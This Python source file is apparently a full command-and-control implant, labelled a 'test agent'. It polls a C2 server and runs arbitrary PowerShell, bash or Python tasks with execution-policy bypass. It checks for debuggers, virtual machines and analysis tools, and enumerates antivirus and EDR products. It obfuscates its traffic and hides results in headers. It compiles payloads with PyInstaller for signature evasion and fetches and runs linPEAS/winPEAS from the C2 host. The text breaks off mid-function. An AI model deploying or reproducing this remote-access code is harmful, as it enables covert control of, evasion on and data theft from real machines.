#!/usr/bin/env python3
# advanced_agent.py - Full-featured test agent with dynamic executable generation
import os, sys, time, base64, json, platform, socket, uuid
import urllib.request, urllib.parse
import threading, argparse, logging, random, re
import subprocess, tempfile, shutil
import string, traceback, signal
from datetime import datetime

# Configure logging
def setup_logging(agent_id=None, debug=False, quiet=False):
    """Setup logging with proper format and handlers"""
    log_formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Determine log file name
    if agent_id:
        log_filename = f'agent_{agent_id}.log'
    else:
        log_filename = 'advanced_agent.log'
    
    # Set log level based on arguments
    if debug:
        log_level = logging.DEBUG
    elif quiet:
        log_level = logging.WARNING
    else:
        log_level = logging.INFO
    
    # Create handlers
    file_handler = logging.FileHandler(log_filename)
    file_handler.setFormatter(log_formatter)
    
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    
    # Configure root logger
    logger = logging.getLogger('AdvancedAgent')
    logger.setLevel(log_level)
    logger.handlers = []  # Clear existing handlers
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

# Global logger (will be replaced when agent initializes)
logger = logging.getLogger('AdvancedAgent')

# Determine Python standard library modules for dependency detection
try:
    # Python 3.10+
    from sys import stdlib_module_names
except ImportError:
    # Earlier Python versions
    import importlib
    stdlib_module_names = sys.modules.keys()

class AdvancedTestAgent:
    """Advanced agent for C2 testing with evasion capabilities and dynamic compilation"""
    
    def __init__(self, c2_url, interval=30, jitter=5, agent_id=None, pyinstaller_path=None):
        """Initialize the agent"""
        self.c2_url = c2_url
        self.base_interval = interval
        self.jitter = jitter
        self.agent_id = agent_id or f"ADV-{socket.gethostname()}-{uuid.uuid4().hex[:6]}"
        self.running = True
        self.results_queue = []
        self.headers = {
            "User-Agent": self._generate_random_ua()
        }
        self.comms_thread = None
        self.results_thread = None
        self.last_activity = time.time()
        self.task_history = []
        self.evasion_mode = False
        self.pyinstaller_path = pyinstaller_path or self._find_pyinstaller()
        self.has_compilation = bool(self.pyinstaller_path)
        
        # Add thread safety locks
        self.results_lock = threading.Lock()
        self.task_history_lock = threading.Lock()
        
        # Initialize and configure logger
        global logger
        logger = setup_logging(self.agent_id)
        
        logger.info(f"Advanced agent initialized with ID: {self.agent_id}")
        logger.info(f"Connecting to C2: {self.c2_url}")
        
        if self.has_compilation:
            logger.info(f"PyInstaller found at: {self.pyinstaller_path}")
        else:
            logger.warning("PyInstaller not found. Compilation features disabled.")
    
    def _find_pyinstaller(self):
        """Find PyInstaller executable if available"""
        try:
            # Check if PyInstaller is in PATH
            if os.name == 'nt':
                pyinstaller_cmd = "pyinstaller.exe"
            else:
                pyinstaller_cmd = "pyinstaller"
                
            result = subprocess.run(
                ["where" if os.name == 'nt' else "which", pyinstaller_cmd],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                path = result.stdout.strip().split('\n')[0]
                return path
                
            # Check if it's installed in the Python environment
            try:
                import PyInstaller
                return "pyinstaller"  # Use command name if module exists
            except ImportError:
                pass
                
            return None
        except Exception as e:
            logger.warning(f"Failed to locate PyInstaller: {e}")
            return None
    
    def _generate_random_ua(self):
        """Generate a randomized User-Agent string"""
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.43"
        ]
        return random.choice(browsers)
    
    def _get_check_interval(self):
        """Get interval with jitter for randomization"""
        return self.base_interval + random.randint(-self.jitter, self.jitter)
    
    def _detect_monitoring(self):
        """Basic detection of monitoring/analysis tools"""
        indicators = []
        
        # Check for debuggers (basic)
        try:
            if sys.gettrace() is not None:
                indicators.append("debugger_detected")
        except:
            pass
        
        # Check for virtualization (basic)
        if platform.system() == "Windows":
            try:
                process = subprocess.run(["systeminfo"], capture_output=True, text=True)
                if "VMware" in process.stdout or "VirtualBox" in process.stdout:
                    indicators.append("vm_detected")
            except:
                pass
        elif platform.system() == "Linux":
            try:
                with open("/proc/cpuinfo") as f:
                    if "hypervisor" in f.read():
                        indicators.append("vm_detected")
            except:
                pass
        
        # Check for security tools (very basic)
        if platform.system() == "Windows":
            processes = ["wireshark.exe", "procmon.exe", "procexp.exe", "tcpview.exe"]
            try:
                output = subprocess.check_output("tasklist", shell=True).decode().lower()
                for proc in processes:
                    if proc in output:
                        indicators.append("security_tool_detected")
                        break
            except:
                pass
                
        return indicators
    
    def collect_system_info(self):
        """Collect detailed system information"""
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "timestamp": datetime.now().isoformat(),
            "monitoring_indicators": self._detect_monitoring()
        }
        
        try:
            info["username"] = os.getlogin()
        except:
            info["username"] = "unknown"
            
        try:
            info["ip_address"] = socket.gethostbyname(socket.gethostname())
        except:
            info["ip_address"] = "unknown"
        
        # Detect security products
        security_products = []
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output("tasklist", shell=True).decode().lower()
                products = {
                    "defender": "MsMpEng.exe",
                    "crowdstrike": "CSFalconService",
                    "symantec": "symantec",
                    "mcafee": "mcafee",
                    "sophos": "sophos",
                    "kaspersky": "kaspersky"
                }
                for name, process in products.items():
                    if process.lower() in output:
                        security_products.append(name)
            except:
                pass
        
        info["security_products"] = security_products
        
        # Check for compilation capability
        info["has_compilation"] = self.has_compilation
            
        return info
    
    def _encode_data(self, data):
        """Encode data for transmission (simulation of obfuscation)"""
        try:
            if self.evasion_mode:
                # Simple XOR encoding with random byte (not real security)
                key = random.randint(1, 255)
                json_data = json.dumps(data).encode()
                encoded = bytes([b ^ key for b in json_data])
                return base64.b64encode(encoded).decode() + f":{key}"
            else:
                # Standard JSON
                return json.dumps(data)
        except Exception as e:
            logger.error(f"Encoding error: {e}")
            # Fall back to standard JSON on error
            return json.dumps(data)
    
    def _decode_data(self, data):
        """Decode received data (simulation of obfuscation)"""
        try:
            if ":" in data and self.evasion_mode:
                # Simple XOR decoding
                encoded, key = data.split(":", 1)
                key = int(key)
                decoded = base64.b64decode(encoded)
                result = bytes([b ^ key for b in decoded])
                return json.loads(result)
            else:
                # Standard JSON
                return json.loads(data)
        except Exception as e:
            logger.error(f"Decoding error: {e}")
            # Return empty dict on error
            return {}
    
    def check_for_tasks(self):
        """Poll C2 server for available tasks"""
        logger.debug(f"Checking for tasks")
        
        try:
            # Add some randomization to the query
            params = {
                "agent": self.agent_id,
                "t": int(time.time())
            }
            
            # Different request patterns based on evasion mode
            if self.evasion_mode:
                # More evasive request pattern
                first_param = list(params.keys())[random.randint(0, len(params)-1)]
                url = f"{self.c2_url}/tasks?{first_param}={params[first_param]}"
                for k, v in params.items():
                    if k != first_param:
                        url += f"&{k}={v}"
            else:
                # Standard request
                url = f"{self.c2_url}/tasks?agent={self.agent_id}"
            
            req = urllib.request.Request(url, headers=self.headers)
            with urllib.request.urlopen(req, timeout=15) as response:
                return json.loads(response.read().decode())
        except urllib.error.URLError as e:
            logger.error(f"Network error when checking tasks: {e}")
            return {"status": "error", "message": str(e)}
        except Exception as e:
            logger.error(f"Error checking for tasks: {e}")
            return {"status": "error", "message": str(e)}
    
    def execute_task(self, code, script_type=None):
        """Execute task received from C2 with script type detection and timeout"""
        logger.info(f"Executing task")
        
        # Log code for history with thread safety
        with self.task_history_lock:
            self.task_history.append({
                "timestamp": time.time(),
                "code": code
            })
        
        # Determine script type if not specified
        if not script_type:
            if code.startswith("#ps") or code.startswith("# ps"):
                script_type = "powershell"
            elif code.startswith("#bash") or code.startswith("# bash"):
                script_type = "bash"
            else:
                script_type = "python"
        
        logger.info(f"Detected script type: {script_type}")
        
        # Add execution timeout for safety
        MAX_EXECUTION_TIME = 60  # seconds
        
        try:
            # Add sleep to simulate anti-sandbox technique
            if self.evasion_mode and random.random() < 0.3:
                logger.debug("Adding random sleep for evasion")
                time.sleep(random.randint(1, 3))
            
            # Handle different script types
            if script_type == "powershell":
                # Strip marker if present
                if code.startswith("#ps") or code.startswith("# ps"):
                    code = re.sub(r'^#\s*ps\s*', '', code, flags=re.MULTILINE)
                    
                # Execute with timeout
                return self._execute_with_timeout(
                    lambda: self._execute_powershell(code),
                    MAX_EXECUTION_TIME,
                    "powershell"
                )
                
            elif script_type == "bash":
                # Strip marker if present
                if code.startswith("#bash") or code.startswith("# bash"):
                    code = re.sub(r'^#\s*bash\s*', '', code, flags=re.MULTILINE)
                    
                # Execute with timeout
                return self._execute_with_timeout(
                    lambda: self._execute_bash(code),
                    MAX_EXECUTION_TIME,
                    "bash"
                )
                
            else:  # Python - DEFAULT TO COMPILATION for signature evasion
                # First try to compile to executable if supported
                if self.has_compilation:
                    try:
                        # Execute with timeout
                        return self._execute_with_timeout(
                            lambda: self._compile_and_execute_python(code),
                            MAX_EXECUTION_TIME * 2,  # Double timeout for compilation
                            "compiled_python"
                        )
                    except Exception as compile_error:
                        logger.warning(f"Compilation failed: {compile_error}, falling back to interpreter")
                
                # Fall back to interpreter if compilation fails or isn't available
                return self._execute_with_timeout(
                    lambda: self._execute_python_interpreter(code),
                    MAX_EXECUTION_TIME,
                    "python_interpreter"
                )
                
        except TimeoutError as te:
            logger.error(f"Task execution timed out: {te}")
            return {"error": f"Execution timed out after {MAX_EXECUTION_TIME} seconds", "executed_as": "timeout"}
        except Exception as e:
            logger.error(f"Error executing task: {traceback.format_exc()}")
            return {"error": str(e), "executed_as": "error"}
    
    def _execute_with_timeout(self, func, timeout_sec, execution_type):
        """Execute a function with timeout"""
        # Create a result container
        result = {"executed_as": execution_type}
        execution_complete = threading.Event()
        
        # Define the worker function
        def worker():
            try:
                worker_result = func()
                # Update the result dictionary with worker's result
                result.update(worker_result)
                # Signal completion
                execution_complete.set()
            except Exception as e:
                # Handle any exception in the worker thread
                result.update({
                    "error": str(e),
                    "stderr": traceback.format_exc()
                })
                execution_complete.set()
        
        # Start worker thread
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()
        
        # Wait for result or timeout
        execution_success = execution_complete.wait(timeout_sec)
        if not execution_success:
            # Timeout occurred
            return {"error": f"Execution timed out after {timeout_sec} seconds", "executed_as": execution_type}
        
        return result
    
    def _execute_powershell(self, code):
        """Execute PowerShell code"""
        logger.info("Executing PowerShell code")
        
        try:
            # Save to temporary file with random name
            temp_dir = tempfile.mkdtemp()
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            script_path = os.path.join(temp_dir, f"{random_name}.ps1")
            
            with open(script_path, "w") as f:
                f.write(code)
            
            # Execute PowerShell
            process = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path],
                capture_output=True, text=True
            )
            
            result = {
                "stdout": process.stdout,
                "stderr": process.stderr,
                "exit_code": process.returncode,
                "executed_as": "powershell"
            }
            
            # Clean up
            try:
                shutil.rmtree(temp_dir)
            except Exception as cleanup_error:
                logger.warning(f"Failed to clean up temp directory: {cleanup_error}")
            
            return result
        except Exception as e:
            logger.error(f"PowerShell execution error: {traceback.format_exc()}")
            return {"error": f"PowerShell execution failed: {str(e)}"}
    
    def _execute_bash(self, code):
        """Execute Bash code"""
        logger.info("Executing Bash code")
        
        if platform.system() == "Windows":
            return {"error": "Bash execution not supported on Windows"}
        
        try:
            # Save to temporary file with random name
            temp_dir = tempfile.mkdtemp()
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            script_path = os.path.join(temp_dir, f"{random_name}.sh")
            
            with open(script_path, "w") as f:
                f.write(code)
            
            # Make executable
            os.chmod(script_path, 0o755)
            
            # Execute bash
            process = subprocess.run(
                ["bash", script_path],
                capture_output=True, text=True
            )
            
            result = {
                "stdout": process.stdout,
                "stderr": process.stderr,
                "exit_code": process.returncode,
                "executed_as": "bash"
            }
            
            # Clean up
            try:
                shutil.rmtree(temp_dir)
            except Exception as cleanup_error:
                logger.warning(f"Failed to clean up temp directory: {cleanup_error}")
            
            return result
        except Exception as e:
            logger.error(f"Bash execution error: {traceback.format_exc()}")
            return {"error": f"Bash execution failed: {str(e)}"}
    
    def _compile_and_execute_python(self, code):
        """Compile Python to executable and run it with better cleanup"""
        logger.info("Compiling Python script to executable...")
        
        if not self.pyinstaller_path:
            raise RuntimeError("PyInstaller not available")
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        try:
            # Add randomization to filename for extra evasion
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            script_path = os.path.join(temp_dir, f"{random_name}.py")
            
            # Extract imports to handle dependencies
            import_pattern = r"^\s*import\s+([a-zA-Z0-9_,\s]+)$|^\s*from\s+([a-zA-Z0-9_\.]+)\s+import"
            imports = re.findall(import_pattern, code, re.MULTILINE)
            required_packages = []
            
            # Process imports
            for imp in imports:
                if imp[0]:  # import x
                    packages = [p.strip() for p in imp[0].split(',')]
                    required_packages.extend(packages)
                elif imp[1]:  # from x import y
                    required_packages.append(imp[1].split('.')[0])
            
            # Install necessary packages
            standard_libs = set(stdlib_module_names)
            for package in set(required_packages):
                # Skip standard library modules
                if package and package not in standard_libs:
                    logger.info(f"Installing package: {package}")
                    try:
                        subprocess.run([
                            sys.executable, "-m", "pip", "install", package,
                            "--quiet"
                        ], check=True)
                    except Exception as pip_error:
                        logger.warning(f"Failed to install {package}: {pip_error}")
            
            # Write the script file
            with open(script_path, "w") as f:
                f.write(code)
            
            # Add randomization to output name
            output_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            
            # Get PyInstaller version
            try:
                pyinstaller_version_output = subprocess.run(
                    ["pyinstaller", "--version"],
                    capture_output=True, text=True
                ).stdout.strip()
                
                # Parse version (output is typically like "6.0.0")
                pyinstaller_version = int(pyinstaller_version_output.split('.')[0]) if pyinstaller_version_output else 0
                logger.debug(f"PyInstaller version: {pyinstaller_version}")
            except Exception as e:
                logger.warning(f"Failed to get PyInstaller version: {e}")
                pyinstaller_version = 0
            
            # Apply additional obfuscation techniques
            obfuscation_args = [
                "--onefile",                          # Single file executable
                "--clean",                            # Clean PyInstaller cache
                "--distpath", temp_dir,               # Output directory
                "--workpath", os.path.join(temp_dir, "build"),
                "--specpath", temp_dir,
                "--name", output_name,                # Randomized name
            ]
            
            # Only add key for PyInstaller versions before 6.0
            if pyinstaller_version < 6:
                obfuscation_args.extend(["--key", uuid.uuid4().hex])  # Encryption key for embedded Python modules
            
            # Platform-specific options
            if os.name == 'nt':
                if random.choice([True, False]):
                    obfuscation_args.append("--noconsole")  # Randomly hide console
                if random.choice([True, False]):
                    obfuscation_args.append("--uac-admin")  # Randomly request admin
            
            # Compile with PyInstaller
            logger.debug(f"Running PyInstaller with args: {obfuscation_args}")
            cmd = ["pyinstaller"] if self.pyinstaller_path == "pyinstaller" else [self.pyinstaller_path]
            
            process = subprocess.run(
                cmd + obfuscation_args + [script_path],
                capture_output=True, text=True
            )
            
            if process.returncode != 0:
                logger.error(f"PyInstaller error: {process.stderr}")
                raise RuntimeError(f"PyInstaller failed: {process.stderr}")
            
            # Get path to the executable
            exe_path = os.path.join(temp_dir, output_name)
            if os.name == "nt":
                exe_path += ".exe"
            
            # Check if file exists
            if not os.path.exists(exe_path):
                # Try to find in 'dist' subdirectory (PyInstaller default)
                alt_path = os.path.join(temp_dir, "dist", output_name)
                if os.name == "nt":
                    alt_path += ".exe"
                if os.path.exists(alt_path):
                    exe_path = alt_path
                else:
                    raise FileNotFoundError(f"Compiled executable not found")
            
            # Execute the compiled file
            logger.info(f"Running compiled executable: {exe_path}")
            exe_process = subprocess.run(
                [exe_path], 
                capture_output=True, text=True
            )
            
            # Return the output
            return {
                "stdout": exe_process.stdout,
                "stderr": exe_process.stderr,
                "exit_code": exe_process.returncode,
                "executed_as": "compiled_executable",
                "binary_size": os.path.getsize(exe_path) if os.path.exists(exe_path) else 0
            }
        
        except Exception as e:
            logger.error(f"Compilation error: {traceback.format_exc()}")
            raise
        
        finally:
            # Clean up temporary files
            try:
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except Exception as cleanup_error:
                logger.warning(f"Failed to clean up temporary directory: {cleanup_error}")
    
    def _execute_python_interpreter(self, code):
        """Execute Python code directly with interpreter"""
        logger.info("Executing Python code with interpreter")
        
        try:
            # Create namespace for execution
            namespace = {"__builtins__": __builtins__}
            
            # Execute the code
            exec(code, namespace)
            
            # Look for the main function
            if "main" in namespace:
                logger.debug("Calling main() function")
                result = namespace["main"]()
                logger.info("Task execution completed successfully")
                return {"output": result, "executed_as": "python_interpreter"}
            else:
                logger.warning("No main() function found in code")
                return {"output": "Code executed but no main() function found", "executed_as": "python_interpreter"}
        except Exception as e:
            logger.error(f"Python execution error: {traceback.format_exc()}")
            return {"error": str(e), "executed_as": "python_interpreter"}

    def fetch_and_run_analysis_script(self, script_name):
        """Download and execute an analysis script from the C2 server"""
        logger.info(f"Fetching analysis script: {script_name}")
        
        try:
            # Request the script from C2 server
            req = urllib.request.Request(
                f"{self.c2_url}/scripts/{script_name}",
                headers=self.headers
            )
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = json.loads(response.read().decode())
                
            if response_data.get("status") == "success":
                script_content = response_data.get("script")
                
                # Create a temporary script file
                temp_dir = tempfile.mkdtemp()
                script_path = os.path.join(temp_dir, script_name)
                
                with open(script_path, "w") as f:
                    f.write(script_content)
                
                # Make it executable if needed
                if script_name.endswith(".sh"):
                    os.chmod(script_path, 0o755)
                
                # Execute based on script type
                if script_name.endswith(".sh"):
                    # Execute bash script
                    try:
                        result = subprocess.run(
                            ["bash", script_path],
                            capture_output=True, text=True, timeout=600  # 10 minute timeout for complex scripts
                        )
                        output = result.stdout
                        error = result.stderr
                        exit_code = result.returncode
                    except subprocess.TimeoutExpired:
                        output = ""
                        error = "Script execution timed out after 10 minutes"
                        exit_code = -1
                    
                elif script_name.endswith(".ps1"):
                    # Execute PowerShell script
                    try:
                        result = subprocess.run(
                            ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path],
                            capture_output=True, text=True, timeout=600
                        )
                        output = result.stdout
                        error = result.stderr
                        exit_code = result.returncode
                    except subprocess.TimeoutExpired:
                        output = ""
                        error = "Script execution timed out after 10 minutes"
                        exit_code = -1
                
                elif script_name.endswith(".bat"):
                    # Execute Windows batch file
                    try:
                        result = subprocess.run(
                            ["cmd.exe", "/c", script_path],  # Use cmd.exe to execute batch files
                            capture_output=True, text=True, timeout=600
                        )
                        output = result.stdout
                        error = result.stderr
                        exit_code = result.returncode
                    except subprocess.TimeoutExpired:
                        output = ""
                        error = "Script execution timed out after 10 minutes"
                        exit_code = -1
                
                else:
                    # Default to Python script
                    try:
                        result = subprocess.run(
                            [sys.executable, script_path],
                            capture_output=True, text=True, timeout=600
                        )
                        output = result.stdout
                        error = result.stderr
                        exit_code = result.returncode
                    except subprocess.TimeoutExpired:
                        output = ""
                        error = "Script execution timed out after 10 minutes"
                        exit_code = -1
                
                # Clean up
                try:
                    shutil.rmtree(temp_dir)
                except Exception as cleanup_error:
                    logger.warning(f"Failed to clean up temp directory: {cleanup_error}")
                
                # Process and structure the results
                structured_results = self._process_analysis_output(output, error, exit_code, script_name)
                return structured_results
                
            else:
                return {"error": "Failed to fetch script", "details": response_data.get("message")}
                
        except Exception as e:
            logger.error(f"Error running analysis script: {traceback.format_exc()}")
            return {"error": f"Analysis script execution failed: {str(e)}"}

    def _process_analysis_output(self, output, error, exit_code, script_name):
        """Process and structure the output from security assessment scripts"""
        try:
            results = {
                "raw_output": output,
                "errors": error,
                "exit_code": exit_code,
                "script_name": script_name,
                "timestamp": datetime.now().isoformat(),
                "categories": {}
            }
            
            # Basic parsing based on script type
            if "linpeas" in script_name.lower():
                results = self._parse_linpeas_output(output, results)
            elif "winpeas" in script_name.lower():
                results = self._parse_winpeas_output(output, results)
            else:
                # Generic parsing for other scripts
                results = self._parse_generic_output(output, results)
            
            # Add system info context
            results["system_info"] = self.collect_system_info()
            
            return results
        
        except Exception as e:
            logger.error(f"Error processing analysis output: {traceback.format_exc()}")
            return {
                "raw_output": output,
                "errors": error,
                "exit_code": exit_code,
                "script_name": script_name,
                "parsing_error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    def _parse_linpeas_output(self, output, results):
        """Parse LinPEAS output to extract structured findings"""
        # Initialize categories
        categories = {
            "system_info": [],
            "users_and_groups": [],
            "sudo_and_suid": [],
            "software_and_versions": [],
            "processes": [],
            "network": [],
            "file_system": [],
            "potential_vulnerabilities": []
        }
        
        # Define pattern matchers for LinPEAS sections
        section_patterns = {
            "system_info": [r".*System Information.*", r".*Operative system.*", r".*Kernel information.*"],
            "users_and_groups": [r".*Users & Groups.*", r".*users with console.*"],
            "sudo_and_suid": [r".*SUID.*", r".*Checking 'sudo'.*", r".*Checking sudo tokens.*"],
            "software_and_versions": [r".*Software Information.*", r".*Installed Software.*"],
            "processes": [r".*Processes.*", r".*Process binaries and permissions.*"],
            "network": [r".*Network Information.*", r".*Analyzing Network.*"],
            "file_system": [r".*Looking for.*files.*", r".*Interesting Files.*"],
            "potential_vulnerabilities": [r".*Possible Exploits.*"]
        }
        
        # Basic analysis - extract lines with [+] or [!] as potentially important
        lines = output.split('\n')
        current_section = None
        
        for line in lines:
            # Identify the current section
            for category, patterns in section_patterns.items():
                for pattern in patterns:
                    if re.match(pattern, line, re.IGNORECASE):
                        current_section = category
                        break
                if current_section:
                    break
            
            # Store interesting findings
            if current_section and (re.search(r'\[\+\]|\[!\]|VULNERABLE|CVE-\d{4}-\d+', line)):
                # Remove ANSI color codes
                clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                categories[current_section].append(clean_line.strip())
        
        # Extract potential vulnerabilities specifically 
        for line in lines:
            if re.search(r'VULNERABLE|CVE-\d{4}-\d+', line, re.IGNORECASE):
                clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                categories["potential_vulnerabilities"].append(clean_line.strip())
        
        # Add to results
        results["categories"] = categories
        
        # Extract a summary of the most important findings
        results["summary"] = []
        for vuln in categories["potential_vulnerabilities"]:
            results["summary"].append(vuln)
        
        if len(results["summary"]) == 0:
            # If no clear vulnerabilities, include some important system info
            for category in ["sudo_and_suid", "users_and_groups", "network"]:
                for item in categories[category][:3]:  # Take first 3 items from each
                    results["summary"].append(item)
        
        return results
    
    def _parse_winpeas_output(self, output, results):
        """Parse WinPEAS output to extract structured findings"""
        # Initialize categories
        categories = {
            "system_info": [],
            "users_and_groups": [],
            "privileges": [],
            "services": [],
            "applications": [],
            "network": [],
            "registry": [],
            "potential_vulnerabilities": []
        }
        
        # Define pattern matchers for WinPEAS sections
        section_patterns = {
            "system_info": [r".*System Information.*", r".*Basic System Information.*"],
            "users_and_groups": [r".*Users & Groups.*", r".*Users.*"],
            "privileges": [r".*Privileges.*", r".*Current Token privileges.*"],
            "services": [r".*Services.*", r".*Interesting Services.*"],
            "applications": [r".*Applications.*", r".*Installed Software.*"],
            "network": [r".*Network.*", r".*Checking Network.*"],
            "registry": [r".*Registry.*", r".*Checking registry.*"],
            "potential_vulnerabilities": [r".*Vulnerabilities.*"]
        }
        
        # Basic analysis - extract lines with [+] as potentially important
        lines = output.split('\n')
        current_section = None
        
        for line in lines:
            # Identify the current section
            for category, patterns in section_patterns.items():
                for pattern in patterns:
                    if re.match(pattern, line, re.IGNORECASE):
                        current_section = category
                        break
                if current_section:
                    break
            
            # Store interesting findings
            if current_section and re.search(r'\[\+\]|\[!\]|VULNERABLE|CVE-\d{4}-\d+', line):
                # Remove ANSI color codes
                clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                categories[current_section].append(clean_line.strip())
        
        # Extract potential vulnerabilities specifically 
        for line in lines:
            if re.search(r'VULNERABLE|CVE-\d{4}-\d+', line, re.IGNORECASE):
                clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                categories["potential_vulnerabilities"].append(clean_line.strip())
        
        # Add to results
        results["categories"] = categories
        
        # Extract a summary of the most important findings
        results["summary"] = []
        for vuln in categories["potential_vulnerabilities"]:
            results["summary"].append(vuln)
        
        if len(results["summary"]) == 0:
            # If no clear vulnerabilities, include some important system info
            for category in ["privileges", "services", "applications"]:
                for item in categories[category][:3]:  # Take first 3 items from each
                    results["summary"].append(item)
        
        return results
    
    def _parse_generic_output(self, output, results):
        """Parse generic script output to extract structured information"""
        # Initialize categories
        categories = {
            "system_info": [],
            "security_findings": [],
            "network_info": [],
            "interesting_findings": []
        }
        
        lines = output.split('\n')
        
        # Look for patterns indicating security findings
        for line in lines:
            clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
            
            if re.search(r'SECUR|VULN|CVE-|RISK|EXPLOIT', clean_line, re.IGNORECASE):
                categories["security_findings"].append(clean_line)
            elif re.search(r'SYSTEM|OS|KERNEL|VERSION', clean_line, re.IGNORECASE):
                categories["system_info"].append(clean_line)
            elif re.search(r'NETWORK|IP|PORT|LISTEN|CONNECT', clean_line, re.IGNORECASE):
                categories["network_info"].append(clean_line)
            elif re.search(r'\[\+\]|\[!\]|WARNING|ALERT|FOUND', clean_line, re.IGNORECASE):
                categories["interesting_findings"].append(clean_line)
        
        # Add to results
        results["categories"] = categories
        
        # Generate a basic summary
        results["summary"] = []
        
        # Prioritize security findings for the summary
        for finding in categories["security_findings"][:5]:  # Top 5 security findings
            results["summary"].append(finding)
        
        # If no security findings, add interesting findings
        if not results["summary"]:
            for finding in categories["interesting_findings"][:5]:  # Top 5 interesting findings
                results["summary"].append(finding)
        
        return results
    
    def run_security_analysis(self):
        """Perform full security analysis using appropriate script for the platform"""
        logger.info("Starting comprehensive security analysis")
        
        try:
            # Determine appropriate script based on OS
            if platform.system().lower() == "windows":
                script_name = "winpeas.bat"
            else:
                script_name = "linpeas.sh"
            
            # Notify user
            print(f"\nStarting security analysis with {script_name}...")
            print("This may take several minutes to complete.")
            print("The script will collect detailed system information for vulnerability analysis.")
            
            # Fetch and run the script
            results = self.fetch_and_run_analysis_script(script_name)
            
            # Check if analysis was successful
            if "error" in results:
                print(f"\nAnalysis failed: {results.get('error')}")
                logger.error(f"Security analysis failed: {results.get('error')}")
                return results
            
            # Process successful results
            print("\nSecurity analysis completed successfully!")
            
            # Show summary of findings
            if "summary" in results and results["summary"]:
                print("\nSummary of findings:")
                for idx, finding in enumerate(results["summary"][:10]):  # Show top 10
                    print(f"  {idx+1}. {finding}")
                
                if len(results["summary"]) > 10:
                    print(f"  ... and {len(results['summary']) - 10} more findings.")
            
            # Queue results for sending to server
            analysis_task_id = f"security_analysis_{int(time.time())}"
            self.queue_result(analysis_task_id, results)
            
            print("\nFull results are being sent to the C2 server for AI analysis.")
            print("Check the server dashboard for complete vulnerability assessment.")
            
            return {
                "status": "success",
                "task_id": analysis_task_id,
                "summary": results.get("summary", [])
            }
        
        except Exception as e:
            logger.error(f"Error in security analysis: {traceback.format_exc()}")
            print(f"\nSecurity analysis failed: {str(e)}")
            return {"error": f"Security analysis failed: {str(e)}"}
    
    def save_oversized_result(self, task_id, result):
        """Save oversized result to local file when server rejects it"""
        try:
            # Create directory for oversized results if it doesn't exist
            results_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "oversized_results")
            os.makedirs(results_dir, exist_ok=True)
            
            # Create filename with timestamp and task ID
            filename = f"oversized_{self.agent_id}_{task_id}_{int(time.time())}.json"
            filepath = os.path.join(results_dir, filename)
            
            # Save the result as JSON
            with open(filepath, "w") as f:
                json.dump({
                    "task_id": task_id,
                    "agent_id": self.agent_id,
                    "timestamp": datetime.now().isoformat(),
                    "result": result
                }, f, indent=2)
            
            logger.info(f"Oversized result for task {task_id} saved to {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Failed to save oversized result: {e}")
            return None
    
    def queue_result(self, task_id, result):
        """Queue task result for sending to C2"""
        logger.debug(f"Queuing result for task {task_id}")
        with self.results_lock:
            self.results_queue.append({
                "task_id": task_id,
                "result": result,
                "timestamp": time.time()
            })
    
    def send_result(self, task_id, result):
        """Send single result to C2 server with retry logic"""
        logger.info(f"Sending result for task {task_id}")
        
        # Try to estimate result size before sending
        estimated_size = len(json.dumps(result))
        size_mb = estimated_size / (1024 * 1024)
        
        if size_mb > 9:  # Conservative threshold before MAX_RESULT_SIZE
            logger.warning(f"Result size is large: {size_mb:.2f}MB, may be rejected by server")
        
        max_retries = 3
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                # Prepare the data
                data = {
                    "agent_id": self.agent_id,
                    "task_id": task_id,
                    "result": result,
                    "timestamp": datetime.now().isoformat()
                }
                
                # Encode the data
                encoded_data = self._encode_data(data)
                
                # Send the request
                if self.evasion_mode:
                    # Use custom header for result data to blend in
                    headers = {**self.headers, "X-Client-Data": encoded_data, "Content-Type": "application/json"}
                    req = urllib.request.Request(
                        f"{self.c2_url}/results",
                        data=b"{}",  # Empty JSON
                        headers=headers
                    )
                else:
                    # Standard JSON in body
                    req = urllib.request.Request(
                        f"{self.c2_url}/results",
                        data=encoded_data.encode(),
                        headers={**self.headers, "Content-Type": "application/json"}
                    )
                    
                with urllib.request.urlopen(req, timeout=15) as response:
                    response_data = json.loads(response.read().decode())
                    return response_data
                    
            except urllib.error.HTTPError as he:
                if he.code == 400:
                    try:
                        response_data = json.loads(he.read().decode())
                        if "Result too large" in response_data.get("message", ""):
                            logger.error(f"Result too large for server (attempt {attempt+1})")
                            if attempt == max_retries - 1:  # On last attempt
